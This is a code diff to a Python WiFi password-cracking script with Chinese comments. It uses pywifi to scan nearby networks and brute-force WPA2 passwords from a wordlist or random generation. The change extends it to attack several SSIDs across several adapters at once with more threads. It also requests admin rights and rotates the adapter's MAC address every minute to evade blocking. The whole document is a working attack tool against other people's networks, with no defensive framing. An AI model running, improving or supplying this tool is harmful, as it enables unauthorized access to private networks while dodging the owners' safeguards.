@@ -1,5 +1,3 @@
-
-# 检查并请求管理员权限（仅限Windows）
 import sys
 import os
 import pywifi  # WiFi操作库
@@ -8,7 +6,7 @@ import threading  # 多线程
 import random  # 随机数生成（用于MAC地址）
 import subprocess  # 调用系统命令
 
-# 自动请求管理员权限
+# 检查并请求管理员权限（仅限Windows）
 if os.name == 'nt':
     try:
         import ctypes
@@ -27,47 +25,57 @@ wifi = pywifi.PyWiFi()
 interfaces = wifi.interfaces()
 
 
+
 # 列出所有可用无线网卡
 print("可用的无线网卡：")
 for idx, iface in enumerate(interfaces):
     print(f"{idx}: {iface.name()}")
-# 选择要使用的无线网卡
-choice = int(input("请选择要使用的无线网卡编号: "))
-interface = interfaces[choice]
-print(f"你选择的网卡: {interface.name()}")
-print(f"接口状态: {interface.status()}")
 
-# 扫描WiFi，最多重试3次
-max_retries = 3
-retry_count = 0
-while retry_count < max_retries:
-    try:
-        interface.scan()
-        print('扫描WiFi中，请稍后………………')
-        time.sleep(10)  # 等待扫描完成
-        wifiList = interface.scan_results()
-        if wifiList:
-            print('扫描完成！\n' + '*' * 50)
-            print('\n%s\t%s\t%s' % ('WiFi编号', 'WiFi信号', 'WiFi名称'))
+# 选择要使用的无线网卡（支持多选，逗号分隔）
+choices = input("请选择要使用的无线网卡编号（可用逗号分隔多个）: ")
+choice_list = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit() and int(x.strip()) < len(interfaces)]
+if not choice_list:
+    print("未选择有效网卡，程序退出。")
+    sys.exit(1)
+selected_interfaces = [interfaces[i] for i in choice_list]
+print("你选择的网卡:", ', '.join([iface.name() for iface in selected_interfaces]))
+for iface in selected_interfaces:
+    print(f"接口 {iface.name()} 状态: {iface.status()}")
+
+
+# 多网卡扫描，合并所有WiFi
+wifiList = []
+for interface in selected_interfaces:
+    max_retries = 3
+    retry_count = 0
+    while retry_count < max_retries:
+        try:
+            interface.scan()
+            print(f'[{interface.name()}] 扫描WiFi中，请稍后………………')
+            time.sleep(10)
+            results = interface.scan_results()
+            if results:
+                wifiList.extend(results)
+                print(f'[{interface.name()}] 扫描完成！')
+                break
+            else:
+                print(f'[{interface.name()}] 扫描失败，正在重试……')
+                retry_count += 1
+        except ValueError as e:
+            print(f'[{interface.name()}] 获取WiFi列表时发生错误: {e}')
+            wifiList = []
             break
-        else:
-            print('扫描失败，正在重试……')
-            retry_count += 1
-    except ValueError as e:
-        print(f'获取WiFi列表时发生错误: {e}')
-        print('可能是无线网卡驱动不兼容或未正确初始化。请检查无线网卡状态。或尝试打开定位服务。')
-        wifiList = []
-        break
-else:
-    print('多次扫描失败，请检查无线网卡或环境。')
-    wifiList = []
+    else:
+        print(f'[{interface.name()}] 多次扫描失败，请检查无线网卡或环境。')
 
-# 整理WiFi信号强度和名称，按信号强度排序
-wifiNewList = []
+
+# 合并去重（按SSID）并整理WiFi信号强度和名称，按信号强度排序
+ssid_dict = {}
 for w in wifiList:
-    wifiNameAndSignal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
-    wifiNewList.append(wifiNameAndSignal)
-wifi_signal_and_name_list = sorted(wifiNewList, key=lambda i: i[0], reverse=True)
+    ssid = w.ssid.encode('raw_unicode_escape').decode('utf-8')
+    if ssid and (ssid not in ssid_dict or (100 + w.signal) > ssid_dict[ssid][0]):
+        ssid_dict[ssid] = (100 + w.signal, ssid)
+wifi_signal_and_name_list = sorted(ssid_dict.values(), key=lambda i: i[0], reverse=True)
 
 # 打印所有扫描到的WiFi
 index = 0
@@ -83,9 +91,14 @@ mode = input("请选择密码模式（1-使用密码本，2-随机生成密码�
 while mode not in ('1', '2'):
     mode = input("输入有误，请重新选择（1-使用密码本，2-随机生成密码）: ").strip()
 
-# 选择要破解的WiFi编号
-wifi_index = int(input("请选择要破解的WiFi编号: "))
-target_ssid = wifi_signal_and_name_list[wifi_index][1]
+
+# 选择要破解的WiFi编号（支持多选，逗号分隔）
+wifi_indices = input("请选择要破解的WiFi编号（可用逗号分隔多个）: ")
+wifi_index_list = [int(x.strip()) for x in wifi_indices.split(',') if x.strip().isdigit() and int(x.strip()) < len(wifi_signal_and_name_list)]
+if not wifi_index_list:
+    print("未选择有效WiFi，程序退出。")
+    sys.exit(1)
+target_ssids = [wifi_signal_and_name_list[i][1] for i in wifi_index_list]
 
 if mode == '1':
     password_file = input("请输入密码本文件路径: ")
@@ -115,18 +128,19 @@ elif mode == '2':
         print(f"随机密码生成失败: {e}")
         passwords = []
 
+
 # 多线程破解相关事件和锁
-found_event = threading.Event()  # 破解成功标志
+found_event = threading.Event()  # 任一WiFi破解成功标志
 lock = threading.Lock()  # 线程锁，保证多线程安全
-lock = threading.Lock()
 
 
-# 尝试连接指定密码
-def try_password(pwd):
+
+# 尝试连接指定密码（多网卡多SSID）
+def try_password(interface, ssid, pwd):
     if found_event.is_set():
-        return
+        return False
     p = pywifi.Profile()
-    p.ssid = target_ssid
+    p.ssid = ssid
     p.auth = pywifi.const.AUTH_ALG_OPEN
     p.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
     p.cipher = pywifi.const.CIPHER_TYPE_CCMP
@@ -135,22 +149,25 @@ def try_password(pwd):
         p.key = pwd
         tmp_profile = interface.add_network_profile(p)
         interface.connect(tmp_profile)
-    time.sleep(5)  # 等待连接
+    time.sleep(3)  # 缩短等待
     if interface.status() == pywifi.const.IFACE_CONNECTED:
-        print(f"破解成功！密码为: {pwd}")
+        print(f"[SUCCESS] 网卡: {interface.name()} SSID: {ssid} 密码: {pwd}")
         found_event.set()
         interface.disconnect()
+        return True
     else:
-        print(f"尝试密码失败: {pwd}")
         interface.disconnect()
+        return False
+
 
 
 # 线程工作函数，遍历分配到的密码
-def worker(passwords):
+def worker(interface, ssid, passwords):
     for pwd in passwords:
         if found_event.is_set():
             break
-        try_password(pwd)
+        if try_password(interface, ssid, pwd):
+            break
 
 
 # 生成随机MAC地址
@@ -204,8 +221,9 @@ def change_mac(interface_name):
         print(f"[MAC] 更换MAC地址失败: {e}")
 
 
+
 # MAC更换线程，每隔一分钟更换一次MAC，直到破解成功
-def mac_changer_thread():
+def mac_changer_thread(interface):
     while not found_event.is_set():
         change_mac(interface.name())
         for _ in range(60):
@@ -214,21 +232,29 @@ def mac_changer_thread():
             time.sleep(1)
 
 
-print(f"开始尝试破解WiFi: {target_ssid}")
 
-# 启动MAC更换线程（守护线程，自动后台运行）
-mac_thread = threading.Thread(target=mac_changer_thread, daemon=True)
-mac_thread.start()
+print(f"开始尝试破解WiFi: {', '.join(target_ssids)}")
 
-# 启动多线程破解，每个线程分配一部分密码
-num_threads = 4  # 可根据CPU调整线程数
+# 启动每个网卡的MAC更换线程（守护线程，自动后台运行）
+mac_threads = []
+for interface in selected_interfaces:
+    mac_thread = threading.Thread(target=mac_changer_thread, args=(interface,), daemon=True)
+    mac_thread.start()
+    mac_threads.append(mac_thread)
+
+# 启动多线程破解，每个SSID每个网卡分配线程
+num_threads = min(8, len(passwords))  # 限制最大线程数
 chunk_size = len(passwords) // num_threads + 1
 threads = []
-for i in range(num_threads):
-    chunk = passwords[i*chunk_size:(i+1)*chunk_size]
-    t = threading.Thread(target=worker, args=(chunk,))
-    threads.append(t)
-    t.start()
+for interface in selected_interfaces:
+    for ssid in target_ssids:
+        for i in range(num_threads):
+            chunk = passwords[i*chunk_size:(i+1)*chunk_size]
+            if not chunk:
+                continue
+            t = threading.Thread(target=worker, args=(interface, ssid, chunk))
+            threads.append(t)
+            t.start()
 
 # 等待所有破解线程结束
 for t in threads:
@@ -236,4 +262,4 @@ for t in threads:
 
 # 最终结果输出
 if not found_event.is_set():
-    print("密码本中的密码均未能破解该WiFi。")
+    print("所有密码均未能破解所选WiFi。")
